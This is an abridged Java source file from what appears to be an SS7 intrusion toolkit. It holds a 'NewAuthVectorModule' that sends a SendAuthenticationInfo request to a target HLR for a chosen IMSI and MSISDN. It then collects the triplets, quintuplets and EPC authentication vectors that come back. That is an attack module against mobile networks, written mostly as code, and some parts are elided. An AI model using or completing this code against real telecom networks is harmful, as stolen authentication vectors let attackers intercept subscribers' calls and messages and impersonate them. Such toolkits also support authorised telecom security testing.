...
import com.rodan.intruder.ss7.entities.payload.mobility.SaiPayload;
...
import com.rodan.intruder.ss7.usecases.model.infogathering.NewAuthVectorOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.NewAuthVectorResponse;
...
@Module(name = Ss7ModuleConstants.NEW_AUTH_VECTOR_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.NEW_AUTH_VECTOR_DISPLAY_NAME, brief = Ss7ModuleConstants.NEW_AUTH_VECTOR_BRIEF,
        description = Ss7ModuleConstants.NEW_AUTH_VECTOR_DESCRIPTION, rank = Ss7ModuleConstants.NEW_AUTH_VECTOR_RANK,
        mainPayload = Constants.SAI_PAYLOAD_NAME)
public class NewAuthVectorModule extends Ss7ModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(NewAuthVectorModule.class);

    @Builder
    public NewAuthVectorModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
    ...
    protected void generatePayload() {
        ...
        var options = (NewAuthVectorOptions) moduleOptions;
        var payload = SaiPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).msisdn(options.getMsisdn())
                .targetHlrGt(options.getTargetHlrGt()).avNumber(options.getAvNumber())
    ...
    @Override
    public void onSendAuthenticationInfoResponse(SaiResponse response) {
        logger.debug("##### Received SAI response!");
        logger.debug(response);
        logger.debug("Parsing response.");

        moduleResponse = NewAuthVectorResponse.builder()
                .tripletList(response.getTripletList()).quintupletList(response.getQuintupletList())
                .epcAuthVectorList(response.getEpcAuthVectorList())
                .build();
        setResultReceived(true);
        logger.debug("SAI completed!");
    }
}
